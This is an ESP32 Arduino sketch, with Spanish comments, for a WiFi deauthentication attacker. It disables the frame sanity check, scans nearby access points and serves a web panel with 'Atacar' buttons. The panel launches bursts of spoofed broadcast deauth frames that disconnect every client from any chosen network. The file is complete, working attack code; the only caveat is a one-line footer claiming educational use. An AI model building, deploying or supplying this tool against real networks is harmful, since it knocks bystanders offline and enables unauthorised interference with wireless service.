#include <stdint.h>
#include <WiFi.h>
#include "esp_wifi.h"

// ========== DESHABILITAR VERIFICACIÓN DE TRAMAS ==========
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// ========== ESTRUCTURA PARA ALMACENAR APs ==========
struct AP_Info {
    uint8_t bssid[6];
    int32_t channel;
    int32_t rssi;
    String ssid;
};

#define MAX_APS 20
AP_Info ap_list[MAX_APS];
int ap_count = 0;

// ========== TRAMA DE DEAUTH (broadcast) ==========
uint8_t deauth_frame_default[26] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // destino: broadcast
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // origen (se rellena después)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID (se rellena después)
    0x00, 0x00
};

// ========== CONFIGURACIÓN DEL PUNTO DE ACCESO ==========
const char* ap_ssid = "MiDeauther";
const char* ap_password = "12345678";
WiFiServer server(80);

// ========== VARIABLES GLOBALES PARA EL ATAQUE ==========
bool attackRunning = false;       // Indica si un ataque está en curso
bool stopAttackFlag = false;      // Bandera para detener el ataque manualmente
String currentTargetSSID = "";    // Red que se está atacando
unsigned long attackStartTime = 0;
unsigned long attackDuration = 30000; // 30 segundos por defecto
uint8_t currentBSSID[6];          // BSSID de la red objetivo
int currentChannel = 0;

// ========== FUNCIONES DE ATAQUE ==========
void sendDeauthFrame(uint8_t bssid[6], int channel) {
    // Cambiar al canal de la red objetivo
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    // Copiar la MAC del router como origen y BSSID
    memcpy(&deauth_frame_default[10], bssid, 6);
    memcpy(&deauth_frame_default[16], bssid, 6);
    // Enviar el paquete (sin delay para máxima velocidad)
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
}

void scanNetworks() {
    int n = WiFi.scanNetworks(false, true, false, 300);
    ap_count = (n > MAX_APS) ? MAX_APS : n;
    for (int i = 0; i < ap_count; i++) {
        memcpy(ap_list[i].bssid, WiFi.BSSID(i), 6);
        ap_list[i].channel = WiFi.channel(i);
        ap_list[i].rssi = WiFi.RSSI(i);
        ap_list[i].ssid = WiFi.SSID(i);
    }
    WiFi.scanDelete();
}

// Inicia el ataque (configura las variables globales)
bool startAttack(String targetSSID) {
    scanNetworks();
    for (int i = 0; i < ap_count; i++) {
        if (ap_list[i].ssid == targetSSID) {
            memcpy(currentBSSID, ap_list[i].bssid, 6);
            currentChannel = ap_list[i].channel;
            currentTargetSSID = targetSSID;
            attackRunning = true;
            stopAttackFlag = false;
            attackStartTime = millis();
            Serial.print("Ataque iniciado contra: ");
            Serial.println(targetSSID);
            return true;
        }
    }
    Serial.println("Red no encontrada para atacar");
    return false;
}

// Detiene el ataque actual
void stopAttack() {
    if (attackRunning) {
        stopAttackFlag = true;
        Serial.println("Deteniendo ataque...");
    }
}

// Función que se llama repetidamente desde loop() para ejecutar el ataque no bloqueante
void runAttack() {
    if (!attackRunning) return;

    // Verificar si se solicitó detener o si se acabó el tiempo
    if (stopAttackFlag || (millis() - attackStartTime >= attackDuration)) {
        attackRunning = false;
        stopAttackFlag = false;
        currentTargetSSID = "";
        Serial.println("Ataque finalizado");
        return;
    }

    // Enviar ráfaga de paquetes (por ejemplo, 100 seguidos sin delay)
    for (int i = 0; i < 100; i++) {
        sendDeauthFrame(currentBSSID, currentChannel);
        // delay(0) cede tiempo al sistema para no bloquear completamente otras tareas
        delay(0);
    }
    // Pequeña pausa para no saturar el buffer del WiFi (opcional, se puede quitar)
    delay(1);
}

// ========== SERVIDOR WEB (SÍNCRONO PERO NO BLOQUEANTE GRACIAS A runAttack) ==========
void handleRoot(WiFiClient &client) {
    String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Deauther Web</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; background: #0a0f1e; color: #e0e0e0; margin: 20px; }
        h1 { color: #ff5555; }
        button { background: #1e2a3a; color: white; border: none; padding: 12px 20px; margin: 10px; border-radius: 8px; cursor: pointer; }
        button:hover { background: #2c3e4e; }
        .stop-btn { background: #aa2e2e; }
        .stop-btn:hover { background: #cc4444; }
        #networks { list-style: none; padding: 0; }
        #networks li { background: #16202a; margin: 8px auto; padding: 10px; width: 80%; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
        .attack-btn { background: #2e6a2e; padding: 6px 12px; }
        .attack-btn:hover { background: #3e8e3e; }
        .status { margin-top: 20px; font-weight: bold; }
        footer { margin-top: 40px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <h1>🛜 Panel Deauther</h1>
    <button id="scanBtn">📡 Escanear redes</button>
    <button id="stopBtn" class="stop-btn">⏹️ Detener ataque</button>
    <ul id="networks"></ul>
    <div id="status" class="status"></div>
    <footer>Uso educativo en redes propias o con autorización</footer>
    <script>
        async function scan() {
            const list = document.getElementById('networks');
            list.innerHTML = '<li>Escaneando...</li>';
            const res = await fetch('/scan');
            const data = await res.json();
            if (data.length === 0) { list.innerHTML = '<li>No se encontraron redes</li>'; return; }
            list.innerHTML = '';
            data.forEach(net => {
                const li = document.createElement('li');
                li.innerHTML = `<span><strong>${net.ssid}</strong> (canal ${net.channel}) ${net.rssi} dBm</span>
                                <button class="attack-btn" data-ssid="${net.ssid}">⚡ Atacar</button>`;
                list.appendChild(li);
            });
            document.querySelectorAll('.attack-btn').forEach(btn => {
                btn.onclick = () => attack(btn.getAttribute('data-ssid'));
            });
        }
        async function attack(ssid) {
            document.getElementById('status').innerHTML = `Atacando ${ssid}...`;
            const res = await fetch('/attack?target=' + encodeURIComponent(ssid));
            const txt = await res.text();
            document.getElementById('status').innerHTML = txt;
        }
        async function stopAttack() {
            document.getElementById('status').innerHTML = 'Deteniendo ataque...';
            const res = await fetch('/stop');
            const txt = await res.text();
            document.getElementById('status').innerHTML = txt;
        }
        document.getElementById('scanBtn').onclick = scan;
        document.getElementById('stopBtn').onclick = stopAttack;
    </script>
</body>
</html>
)rawliteral";
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    client.println(html);
}

void handleScan(WiFiClient &client) {
    scanNetworks();
    String json = "[";
    for (int i = 0; i < ap_count; i++) {
        if (i > 0) json += ",";
        json += "{\"ssid\":\"" + ap_list[i].ssid + "\",";
        json += "\"rssi\":" + String(ap_list[i].rssi) + ",";
        json += "\"channel\":" + String(ap_list[i].channel) + "}";
    }
    json += "]";
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: application/json");
    client.println("Connection: close");
    client.println();
    client.println(json);
}

void handleAttack(WiFiClient &client, String target) {
    if (attackRunning) {
        client.println("HTTP/1.1 409 Conflict");
        client.println("Content-Type: text/plain");
        client.println("Connection: close");
        client.println();
        client.print("Ya hay un ataque en curso contra: ");
        client.println(currentTargetSSID);
        return;
    }
    if (startAttack(target)) {
        client.println("HTTP/1.1 200 OK");
        client.println("Content-Type: text/plain");
        client.println("Connection: close");
        client.println();
        client.print("Ataque iniciado contra: ");
        client.println(target);
    } else {
        client.println("HTTP/1.1 404 Not Found");
        client.println("Content-Type: text/plain");
        client.println("Connection: close");
        client.println();
        client.println("Red no encontrada");
    }
}

void handleStop(WiFiClient &client) {
    stopAttack();
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/plain");
    client.println("Connection: close");
    client.println();
    client.println("Ataque detenido (si estaba en curso)");
}

// ========== SETUP ==========
void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("Iniciando Deauther con ataque cancelable");

    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous(false);

    WiFi.softAP(ap_ssid, ap_password);
    Serial.print("Punto de acceso creado. IP: ");
    Serial.println(WiFi.softAPIP());

    server.begin();
    Serial.println("Servidor web iniciado");
}

// ========== LOOP PRINCIPAL (no bloqueante) ==========
void loop() {
    // Ejecutar el ataque si está activo (no bloquea)
    runAttack();

    // Atender peticiones web (solo si hay cliente)
    WiFiClient client = server.available();
    if (!client) return;

    String request = "";
    while (client.connected() && !client.available()) delay(1);
    if (client.available()) {
        request = client.readStringUntil('\r');
        client.readStringUntil('\n');
        // Leer el resto de headers (no los necesitamos)
        while (client.available() && client.readStringUntil('\n') != "\r");
    }

    // Procesar la petición
    if (request.indexOf("GET / ") >= 0 || request.indexOf("GET / HTTP") >= 0) {
        handleRoot(client);
    }
    else if (request.indexOf("GET /scan") >= 0) {
        handleScan(client);
    }
    else if (request.indexOf("GET /attack") >= 0) {
        int start = request.indexOf("target=");
        if (start >= 0) {
            start += 7;
            int end = request.indexOf(" ", start);
            if (end < 0) end = request.length();
            String target = request.substring(start, end);
            target.replace("%20", " ");
            target.replace("%2F", "/");
            target.replace("%3A", ":");
            handleAttack(client, target);
        } else {
            client.println("HTTP/1.1 400 Bad Request");
            client.println("Connection: close");
            client.println();
            client.println("Missing target");
        }
    }
    else if (request.indexOf("GET /stop") >= 0) {
        handleStop(client);
    }
    else {
        client.println("HTTP/1.1 404 Not Found");
        client.println("Connection: close");
        client.println();
        client.println("Not Found");
    }

    delay(10);
    client.stop();
}